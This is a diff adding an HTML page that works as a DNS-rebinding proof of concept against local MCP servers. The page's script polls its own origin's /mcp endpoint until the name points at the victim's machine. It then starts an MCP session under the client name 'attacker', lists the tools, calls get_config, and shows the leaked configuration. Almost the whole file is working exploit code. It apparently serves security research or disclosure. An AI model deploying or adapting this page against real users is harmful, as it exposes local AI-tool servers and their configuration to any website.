@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reading your local MCP</title>
+<style>
+  body { font: 16px/1.5 system-ui, sans-serif; margin: 2rem; max-width: 780px; color: #1a1a1a; }
+  h1 { font-size: 1.5rem; }
+  #status { font-size: 1.25rem; font-weight: 700; padding: 1rem; border-radius: 10px; margin: 1.25rem 0; }
+  .working { background: #eef2ff; color: #3538cd; }
+  .leaked  { background: #fde8e8; color: #b42318; }
+  pre { background: #f6f8fa; padding: 1rem; border-radius: 10px; overflow: auto; font-size: 13px; }
+</style>
+</head>
+<body>
+  <h1>A public web page reading your local MCP</h1>
+  <div id="status" class="working">reading your local MCP&hellip;</div>
+  <pre id="output"></pre>
+
+<script>
+const MCP = location.origin + "/mcp";
+const statusEl = document.getElementById("status");
+const outputEl = document.getElementById("output");
+
+let sessionId = null;
+
+function timeout(ms) { const c = new AbortController(); setTimeout(() => c.abort(), ms); return c.signal; }
+
+// One MCP message. Returns "wait" while we're still hitting the attacker server
+// (pre-rebind). Reads the SSE response only up to the first data frame, because
+// the Streamable HTTP stream may stay open after it.
+async function send(message) {
+  const headers = { "Content-Type": "application/json", "Accept": "application/json, text/event-stream" };
+  if (sessionId) headers["mcp-session-id"] = sessionId;
+
+  const res = await fetch(MCP, { method: "POST", headers, body: JSON.stringify(message), signal: timeout(5000) });
+  if (res.headers.get("x-rebind") === "public") return "wait";
+  const sid = res.headers.get("mcp-session-id");
+  if (sid) sessionId = sid;
+  if (!res.body) return null;
+
+  const reader = res.body.getReader();
+  const decoder = new TextDecoder();
+  let buffer = "";
+  try {
+    while (true) {
+      const { value, done } = await reader.read();
+      if (value) buffer += decoder.decode(value, { stream: true });
+      const frame = buffer.match(/^data:\s*(.+)$/m);
+      if (frame) { try { return JSON.parse(frame[1]); } catch (_) {} }
+      if (done) return null;
+    }
+  } finally {
+    try { reader.cancel(); } catch (_) {}
+  }
+}
+
+async function readVictim() {
+  const init = await send({ jsonrpc: "2.0", id: 1, method: "initialize",
+    params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "attacker", version: "0" } } });
+  if (init === "wait" || !init) return false;
+
+  await send({ jsonrpc: "2.0", method: "notifications/initialized" });
+  const tools = await send({ jsonrpc: "2.0", id: 2, method: "tools/list", params: {} });
+  const config = await send({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "get_config", arguments: {} } });
+
+  statusEl.className = "leaked";
+  statusEl.textContent = "READ your local MCP";
+  outputEl.textContent = JSON.stringify({
+    server: init.result.serverInfo,
+    tools: tools.result.tools.map(t => t.name),
+    get_config: JSON.parse(config.result.content[0].text),
+  }, null, 2);
+  return true;
+}
+
+(async () => {
+  for (let attempt = 1; attempt <= 120; attempt++) {
+    statusEl.textContent = "reading your local MCP… (" + attempt + ")";
+    try { if (await readVictim()) return; }
+    catch (e) { /* not rebound yet, or stream aborted */ }
+    await new Promise(r => setTimeout(r, 1000));
+  }
+  statusEl.textContent = "could not reach a local MCP";
+})();
+</script>
+</body>
+</html>
